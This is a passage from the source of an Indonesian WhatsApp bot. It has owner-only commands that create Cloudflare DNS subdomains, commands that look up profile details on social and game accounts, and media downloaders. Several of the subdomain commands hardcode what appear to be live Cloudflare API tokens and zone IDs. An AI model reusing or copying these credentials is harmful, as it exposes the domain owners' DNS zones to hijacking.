               let tld = "sellerpanell-store.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 @𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           
 case 'd40': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "583196d8ec9e16fbe5bbe944efbb3d8a";
               let apitoken = "jZ4EuzWs4-ktGcfkwht3NbZfGlZm_VnWjtYyG-1U";
               let tld = "rafeyfah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break

case 'd41': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "144f7c48ca035135390fe5adb49d642f";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayyoffc.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd42': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4fc8192dd8160307100b207d308da80c";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayypedia.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd43': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a1fa0ffcde9549bd36e9ae3de4b66b4a";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panell.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd44': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a112599ddfdd5a2bac5dc91864020015";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panellstoree.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd45': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fc1ee81d43fce2e42edcef622e5cf370";
               let apitoken = "F3bZqMzcRMxxinfwtcLVSLkfu85eNyxQ52JvDSyu";
               let tld = "windastore.live";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd46': {
    if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c68dc22e3ccc2aaf123f68011e3187d1";
               let apitoken = "XICagFHVbQ52OkAbYqglNUKBv0cps3Qe8h6YC4Sa";
               let tld = "zanofc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *TIDAK UNTUK WHM*
> *SELALU BERHATI² TERHADAP DDOS*
> *JAGAN SPAM BOT*
> *JIKA ADA SUB RUSAK LAPOR*
 ©𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙨𝙩

*TERIMAKASIH*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'q': case 'quoted': {
if (!m.quoted) return replyviex('Reply the Message!!')
let xeonquotx= await TradzSigma.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replyviex('Pesan yang Anda balas tidak dikirim oleh bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2':{
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (!q) return replyviex(`Contoh ${prefix+command} unicorn_xeon`)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const aj = await igstalk(`${q}`)
TradzSigma.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (!q) return replyviex(`Contoh ${prefix+command} 946716486`)
replyviex(mess.wait)
const data = await fetchJson(`https://api.yanzbotz.live/api/stalker/free-fire?id=${encodeURIComponent(text)}`)
const data1 = data.result
replyviex(`*/ Free Fire Stalker \\*

Id : ${q}
Nickname : ${data1}`)
}
break
case "ytstalk": case "infoyt": case "youtubestalk": {
 if (!text) return replyviex("Example: .ytstalk namaChannel")
 try {
 const apiUrl = `https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${encodeURIComponent(text)}`
 const response = await fetch(apiUrl)
 const data = await response.json()
 if (data.status !== 200) {
 return replyviex(`Error: ${data.content || "Failed to fetch data"}`)
 }
 const result = data.result
 const additionalInfo = result.additionalInfo
 let caption = `*🔍 YOUTUBE CHANNEL INFO*\n\n`
 caption += `*Channel:* ${result.channel}\n`
 caption += `*Description:* ${result.description || "No description"}\n`
 caption += `*URL:* ${result.url}\n\n`
 caption += `*📊 STATS*\n`
 caption += `*Subscribers:* ${additionalInfo.totalSubs || "0"}\n`
 caption += `*Total Videos:* ${additionalInfo.totalVideos || "0"}\n`
 caption += `*Total Views:* ${additionalInfo.views || "0"}\n`
 caption += `*Joined:* ${additionalInfo.join || "Unknown"}\n`
 if (result.socialMediaLinks && result.socialMediaLinks.length > 0) {
 caption += `\n*🔗 SOCIAL MEDIA*\n`
 result.socialMediaLinks.forEach((link, index) => {
 caption += `${index + 1}. ${link.url}\n`
 })
 }
 if (result.latestVideos && result.latestVideos.length > 0) {
 caption += `\n*📺 LATEST VIDEOS*\n`
 for (let i = 0; i < Math.min(3, result.latestVideos.length); i++) {
 const video = result.latestVideos[i]
 caption += `${i + 1}. *${video.title}*\n`
 caption += ` Views: ${video.views}\n`
 caption += ` URL: ${video.videoUrl}\n\n`
 }
 }
 await TradzSigma.sendMessage(m.chat, {
 image: { url: result.profile },
 caption: caption
 }, { quoted: m })
 } catch (error) {
 console.log(error)
 replyviex('Error saat mengambil informasi channel YouTube')
 }
}
break
case 'mlstalk': {
if (!text) return replyviex(`Contoh penggunaan:\n${prefix + command} id|zona id\n\nEx.\n${prefix + command} 157228049|2241`)
 async function mlstalk(id, zoneId) {
    return new Promise(async (resolve, reject) => {
      axios
        .post(
          'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
          new URLSearchParams(
            Object.entries({
              productId: '1',
              itemId: '2',
              catalogId: '57',
              paymentId: '352',
              gameId: id,
              zoneId: zoneId,
              product_ref: 'REG',
              product_ref_denom: 'AE',
            })
          ),
          {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              Referer: 'https://www.duniagames.co.id/',
              Accept: 'application/json',
            },
          }
        )
        .then((response) => {
          resolve(response.data.data.gameDetail)
        })
        .catch((err) => {
          reject(err)
        })
    })
}

var { userName } = await mlstalk(text.split('|')[0], text.split('|')[1]).catch(async _ => await replyviex("User tidak di temukan"))
var vf = `*MOBILE LEGENDS STALK*

*ID: ${text.split('|')[0]}*
*ZONA ID: ${text.split('|')[1]}*
*Username: ${userName ? userName : "Kosong"}*`
replyviex(vf)
         }
         break
case 'npmstalk':{
  replyviex(mess.wait)
if (!q) return replyviex(`Contoh ${prefix+command} xeonapi`)
replyviex(mess.wait)
eha = await npmstalk.npmstalk(q)
replyviex(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
//=========================================\\
case 'twitterdl':
case 'twitter': {
  function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return replyviex('Linknya mana, bro..');
try {
  TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
let { SD, HD, desc, thumb, audio } = await fg.twitter(text)
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
TradzSigma.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  console.error(e);
  replyviex('Server error!');
  return e.toString();
}
}
break
//case 'ig':
//case 'instagram': {
//const qs = require('qs');
//async function instanav(url) {
//    const data = qs.stringify({
//        'q': url,
//        't': 'media',
//        'lang': 'en'
//    });
//
//    const config = {
//method: 'POST',
 //       url: 'https://instanavigation.app/api/ajaxSearch',
//        headers: {
  //          'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
//            'Accept': 'application/json, text/javascript, */*; q=0.01',
      //      'accept-language': 'id-ID',
    //        'referer': 'https://instanavigation.app/',
   //         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
  //          'x-requested-with': 'XMLHttpRequest',
//     //       'origin': 'https://instanavigation.app',
 //         'alt-used': 'instanavigation.app',
//            'sec-fetch-dest': 'empty',
 //           'sec-fetch-mode': 'cors',
 //           'sec-fetch-site': 'same-origin',
  //          'priority': 'u=0',
   //         'te': 'trailers',
//        },
  //      data: data
 //   };

//    const api = await axios.request(config);
//    const html = api.data.data;

//    const $ = cheerio.load(html);
//    const downloadUrls = [];
//    $('.download-items__btn a').each((index, element) => {
  //      const href = $(element).attr('href');
//        if (href) {
 //           downloadUrls.push(href);
   //     }
//    });

   // const urlParams = new URLSearchParams(downloadUrls[0]?.split('?')[1]); // Ambil filename dari URL pertama
//    let filename = urlParams.get('filename');
//    if (filename && filename.endsWith('.mp4')) {
//        filename = filename.slice(0, -4);
//        return {
//        title: filename || 'Title not found',
//        downloadUrls: downloadUrls.length > 0 ? downloadUrls : ['Download URL not found']
//    };}    if (args.length == 0) {
 //       reply(`Contoh: ${prefix + command} <link Instagram>`);
 //       TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
 //       break;
//    }
//    const url = args[0];
   // if (!url.match(/instagram\.com\/(reel|p|tv)/gi)) {
  //      reply('URL yang Anda masukkan salah! Pastikan URL adalah link Instagram Reel, Post, atau TV.');
 //       break;
   // }
//    try {
//        const result = await instanav(url);
 //       const caption = `乂 *I N S T A G R A M  D O W N L O A D*

//• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏ:* 
//${result.title}

//${global.botname}`;
   //     if (result.downloadUrls[0] !== 'Download URL not found') {
  //          await TradzSigma.sendMessage(m.chat, { 
     //           video: { url: result.downloadUrls[0] }, 
   //             caption: caption 
  //          });
   //     } else {
      //      reply('Maaf, video tidak ditemukan. Pastikan URL valid.');
//        }
//    } catch (e) {
//        console.log(e);
  //      reply('Terjadi kesalahan saat memproses URL. Pastikan URL benar.');
//    }
//    }
 
//=============================================================
case 'mediafire5': {
const { fetch } = require("undici");
const { lookup } = require("mime-types");
const cheerio = require("cheerio");
if (!text) return replyviex(`contoh ${prefix + command} https://wwww.mediafire.com/file/u0etafh6ujcd6or/Yoimiya.zip/file`)
TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
async function mediafire(url) {
    return new Promise(async (resolve, reject) => {
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);

        const type = $(".dl-btn-cont").find(".icon").attr("class").split("archive")[1].trim();
        const filename = $(".dl-btn-label").attr("title");
        const size = $('.download_link .input').text().trim().match(/\((.*?)\)/)[1];
        const ext = filename.split(".").pop();
        const mimetype =
            lookup(ext.toLowerCase()) || "application/" + ext.toLowerCase();
        const download = $(".input").attr("href");
        resolve({
            filename,
            type,
            size,
            ext,
            mimetype,
            download,
        });
    }).catch((e) =>
        reject({
            msg: "Gagal mengambil data dari link tersebut",
        }),
    );
}

    if (!text) return replyviex(`*Contoh :* ${prefix + command} *[mediafire url]*`);

    const mediafireRegex = /^(https?:\/\/)?(www\.)?mediafire\.com\/.+$/i;
    if (!mediafireRegex.test(text)) {
        return replyviex(`*Contoh :* ${prefix + command} *[mediafire url]*`);
    }

    try {
        let result = await mediafire(text);

        let cpt = `*乂 MEDIAFIRE - DOWNLOADER*

   ◦ File Name : ${result.filename}
   ◦ Type : ${result.type}
   ◦ Size : ${result.size}`;

        let filename = result.filename;
        let url = result.download;

        await TradzSigma.sendFile(m.chat, url, filename, cpt, m, false, {
            mimetype: result.mimetype,
            fileName: filename,
        });
    } catch (e) {
        return e.message;
    }
}
break
//===================
case 'webtoon':
case 'webtoons': {
const fetch = require("node-fetch")
if (!text) return replyviex(`${prefix + command} how to kontol`)
replyviex('wait proses 🗿')
await fetch(`https://api.diioffc.web.id/api/search/webtoons?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian WEBTOONS*\n\n'
for (let i of response.result) {
teks += `*◦ Judul :* ${i.judul}\n`
teks += `*◦ Genre :* ${i.genre}\n`
teks += `*◦ Author :* ${i.author}\n`
teks += `*◦ Likes :* ${i.likes}\n`
teks += `*◦ Link Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => replyviex('Error 🗿'))
}
break
//===============
case 'igdl': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
if (!text) return replyviex(`Contoh: ${prefix + command} link`);
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  
  try {
    let media = await (await fetch(`https://endpoint.web.id/downloader/instagram?key=${global.key}&url=${text}`)).json();
    let data = media.result;
    
    if (data.videoUrl) {
      await TradzSigma.sendMessage(m.chat, { 
        video: { url: data.videoUrl }, 
        caption: 'success kak',
        mimetype: 'video/mp4' 
      }, { quoted: m });
    } else if (data.imageUrl) {
      await TradzSigma.sendMessage(m.chat, { 
        image: { url: data.imageUrl }, 
        caption: 'success kak',
        mimetype: 'image/jpeg' 
      }, { quoted: m });
    } else {
      replyviex('Media tidak ditemukan!');
    }
  } catch (e) {
    m.reply(e.message);
    console.log(e);
  }
